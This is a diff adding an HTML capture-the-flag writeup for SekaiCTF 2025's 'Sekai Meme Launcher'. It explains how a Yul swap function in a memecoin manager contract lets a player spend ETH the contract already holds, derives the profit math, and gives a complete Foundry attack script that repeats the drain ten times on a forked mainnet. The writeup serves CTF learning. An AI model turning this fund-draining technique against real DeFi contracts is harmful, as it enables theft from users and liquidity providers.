@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SekaiCTF 2025 — Sekai Meme Launcher (Writeup)</title>
+  <meta name="description" content="CTF writeup for SekaiCTF 2025: Sekai Meme Launcher" />
+  <link href="/assets/css/writeup.css" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <link rel="stylesheet"
+    href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+  <script src="/assets/js/math.js"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+  </script>
+</head>
+
+<body>
+  <div class="wrap">
+    <header>
+      <h1>SekaiCTF 2025 — Sekai Meme Launcher</h1>
+
+    </header>
+
+    <hr>
+
+    <main id="top">
+
+      <img src="/assets/img/sekaimeme.png" width="800px"></img>
+
+      <section>
+        <h2 id="summary">Summary </h2>
+        <div id="summary-md">
+          <p>
+            We start with <b>1.1 ETH</b>. The environment is a fork of the Ethereum mainnet.
+            The goal is to obtain more than <b>50 ETH</b> by exploiting the <code>MemecoinManager</code> contract.
+
+            The major function of the <code>MemeManager.sol</code> contract is to create different
+            <code>(Memecoin, WETH)</code> UniswapV2 pools and provide liquidity to it. The Memecoin is a standard ERC20
+            token.
+
+            Moreover, we also have only the option to <code>preSale</code>, where we can pay to get
+            Memecoin minted before liquidity is provided.
+          </p>
+        </div>
+
+        <br>
+
+
+
+        <pre><code class="language-solidity">
+function preSale(address token, uint256 amount) external payable {
+    MemeInfo memory info = tokenInfo[token];
+    require(info.token != address(0), "MemeManager: unknown token");
+    require(!info.initialLiquidityProvided, "MemeManager: preSale ended");
+    require(msg.value >= 0.5 * 1e18, "MemeManager: too little");
+    require(msg.value * 1e18 == amount * info.initialPriceWeiPerToken, "MemeManager: wrong amount");
+    MemeToken(token).mint(msg.sender, amount);
+}
+</code></pre>
+
+        <br>
+
+        In MemeManager.sol, there is also a swap function implemented in Yul assembly, which brings the vulnerability.
+
+        <pre><code class="language-solidity">
+function swap() external payable returns (bytes memory error){
+        assembly {
+            let valueLeft := callvalue()
+            let n:= shr(248, calldataload(4))
+            let cur
+            for { let i := 0 } lt(i, n) { i := add(i, 1) } {
+                cur := add(5, mul(0x14, i))
+                let token := shr(96, calldataload(cur))
+                cur := add(cur, mul(n, 0x14))
+                let amount:= calldataload(cur)
+                cur := add(cur, mul(n, 0x20))
+                let dir:= shr(248, calldataload(cur))
+                let ptr := mload(0x40)
+                switch dir
+                case 1 {
+                    mstore(ptr, 0x7ff36ab500000000000000000000000000000000000000000000000000000000) // swapExactETHForTokens(uint256,address[],address,uint256)
+                    mstore(add(ptr, 0x04), 0)
+                    mstore(add(ptr, 0x24), 0x80)
+                    mstore(add(ptr, 0x44), caller())
+                    mstore(add(ptr, 0x64), timestamp())
+                    let tail := add(ptr, 0x84)
+                    mstore(tail, 2)
+                    mstore(add(tail, 0x20), sload(WETH.slot))
+                    mstore(add(tail, 0x40), token)
+                    let ok := call(gas(), sload(ROUTER.slot), amount, ptr, add(0x84, 0x60), 0, 0)
+                    let rd := returndatasize()
+                    if iszero(ok) { returndatacopy(0, 0, rd) revert(0, rd) }
+                    valueLeft := sub(valueLeft, amount)
+                }
+                default {
+                    mstore(ptr, 0x23b872dd00000000000000000000000000000000000000000000000000000000) // transferFrom(address,address,uint256)
+                    mstore(add(ptr, 0x04), caller())
+                    mstore(add(ptr, 0x24), address())
+                    mstore(add(ptr, 0x44), amount)
+                    let ok := call(gas(), token, 0, ptr, 0x64, 0, 0)
+                    let rd := returndatasize()
+                    if iszero(ok) { returndatacopy(0, 0, rd) revert(0, rd) }
+                    mstore(ptr, 0x095ea7b300000000000000000000000000000000000000000000000000000000) // approve(address,uint256)
+                    mstore(add(ptr, 0x04), sload(ROUTER.slot))
+                    mstore(add(ptr, 0x24), amount)
+                    ok := call(gas(), token, 0, ptr, 0x44, 0, 0)
+                    rd := returndatasize()
+                    if iszero(ok) { returndatacopy(0, 0, rd) revert(0, rd) }
+                    mstore(ptr, 0x18cbafe500000000000000000000000000000000000000000000000000000000) // swapExactTokensForETH(uint256,uint256,address[],address,uint256)
+                    mstore(add(ptr, 0x04), amount)
+                    mstore(add(ptr, 0x24), 0)
+                    mstore(add(ptr, 0x44), 0xa0)
+                    mstore(add(ptr, 0x64), caller())
+                    mstore(add(ptr, 0x84), timestamp())
+                    let tail2 := add(ptr, 0xa4)
+                    mstore(tail2, 2)
+                    mstore(add(tail2, 0x20), token)
+                    mstore(add(tail2, 0x40), sload(WETH.slot))
+                    ok := call(gas(), sload(ROUTER.slot), 0, ptr, add(0xa4, 0x60), 0, 0)
+                    rd := returndatasize()
+                    if iszero(ok) { returndatacopy(0, 0, rd) revert(0, rd) }
+                }
+            }
+        }
+    }
+</code></pre>
+
+        The assembly reads the calldata with the following structure. For simplicity, we only plot for n = 1 and n = 2.
+
+        <br>
+        <br>
+
+        <div class="img-wrap">
+          <img src="/assets/img/block1.png" alt="block n=1" width="800">
+          <div class="caption">n = 1</div>
+        </div>
+
+        When n = 2, there is some issue in the code as different variables on stack come from overlapping area of
+        calldata, but it does not matter, we are only going to use n = 1 case.
+        <br>
+        <br>
+
+        <div class="img-wrap">
+          <img src="/assets/img/block2.png" alt="block n=1" width="800">
+          <div class="caption">n = 2</div>
+        </div>
+
+        <p>We utilize the case 1 instead of default in the switch, which calls the Uniswapv2
+          <code>swapExactETHForTokens</code>.
+        </p>
+
+        <h2 id="summary"> The attack logic </h2>
+
+        <p>When we call <code>presale</code>, we pay the <code>MemeManager</code> contract for minting Memecoin. Then,
+          we ask <code>MemeManager</code> to add liquidity to the pool <code>(Memecoin, WETH)</code>. </p>
+
+        <p>The vulnerability is that the swapExactETHForTokens function in the swap expects us to provide ETH in order
+          to swap for Memecoin. However, we can instead use the ETH that remains in the MemeManager (from our presale
+          payment). After swapping for Memetoken, we use all the Memetoken to swap back for ETH using the
+          UniswapV2Router.</p>
+
+        <h3 id="summary"> Why does this attack work? </h3>
+
+        <p>It is similar to the scenario that we exchange USD for Euro, but then still being able to use the USD we
+          already exchanged to get some more Euros. So when we swap all our Euros for USD, we get more USD than we
+          initially have.</p>
+
+        <p>We use $x$ ETH in presale to mint $10000x$ tokens. It is similar to the scenario that we exchange USD for
+          Euro, but then still being able to use the USD we already exchanged to get some more Euros. So when we swap
+          all our Euros for USD, we get more USD than we initially have.
+          How much can we gain for the attack? When we use x ether to get presale Memecoin, we get $10000x$ Memecoin.
+          Then we call ProvideLiquidty to create a pool with $100000$ Memecoin and $10$ ETH.
+        </p>
+        <p>
+          We call swap, use the x ETH that we paid to swap for $\frac{100000 x}{10+x}$ of Memecoin. Now we have $10000 x
+          + \frac{100000 x}{10+x}$ Memecoin. The uniswapv2 pool has $\frac{1000000}{10+x}$ Memecoin and $10+x$ ETH.
+        </p>
+
+        <p>
+          We swap all our Memecoin for ETH, after swapping, we have
+          $$(10 + x) - \frac{1000000}{10000 x + 100000} = 10+ x - \frac{100}{10+x} = x + \frac{10x}{10+x} \text{ ETH}$$
+        </p>
+
+        <p>Since we start by paying $x$ ETH, we get $\frac{10 x}{10 + x}$ extra ETH for free.</p>
+
+        <p>We repeat the steps, the larger the value of x we use, the more ETH we can earn. Note that we can do this at
+          most 10 times due to the limit of the VC (which funds the MemeManager during provideLiquidity) having only 100
+          ETH. We also need to account for gas fees on Mainnet transactions, so each time we should reserve 0.1 ETH for
+          gas.</p>
+
+        Here is the script that carry out our attack.
+
+
+
+        <pre><code class="language-solidity">
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import {console2, Script} from "forge-std/Script.sol";
+import "src/MemeManager.sol";
+import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
+
+contract AttackScript is Script {
+    address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    MemeManager memeManager = MemeManager(payable(vm.envAddress("MANAGER")));
+    function run() external {
+        address token;
+        uint256 amount;
+        address[] memory path = new address[](2);
+        bool success;
+        amount = 1 ether;
+        uint256 pk = vm.envUint("PRIVATE_KEY");
+        address player = vm.addr(pk);
+        vm.startBroadcast(player);
+        for (uint i = 0; i < 10; i++) {  
+            (token, ) = memeManager.createMeme("piggy", "PIG", 0.0001 ether);
+            memeManager.preSale{value:amount}(token, 10_000*amount);
+            memeManager.ProvideLiquidity(token, block.timestamp + 1 days);
+            IERC20(token).approve(address(memeManager), type(uint256).max);
+            (success,) = address(memeManager).call(abi.encodePacked(bytes4(0x8119c065), uint8(1), uint160(token), amount, uint256(1 << 248)));        
+            if (!success) {revert();}
+            IERC20(token).approve(router, type(uint256).max);
+            path[0] = token;
+            path[1] = weth;
+            IUniswapV2Router02(router).swapExactTokensForETH(IERC20(token).balanceOf(player), 0, path, player, block.timestamp + 1 days);
+            amount = player.balance - 0.1 ether;
+        }
+        vm.stopBroadcast();
+        
+        console2.log(player.balance);
+    }
+}
+</code></pre>
+
+
+
+
+      </section>
+    </main>
+  </div>
+
+
+  <!-- 页尾：hljs 核心 + 语言包 -->
+  <!-- 核心 -->
+  <!-- 建议：主题样式放在 <head> 且在你的 writeup.css 之后 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+  <!-- 页尾：hljs 核心（只引一次） -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <script src="/assets/js/code.js"></script>
+
+
+
+</body>
+
+</html>
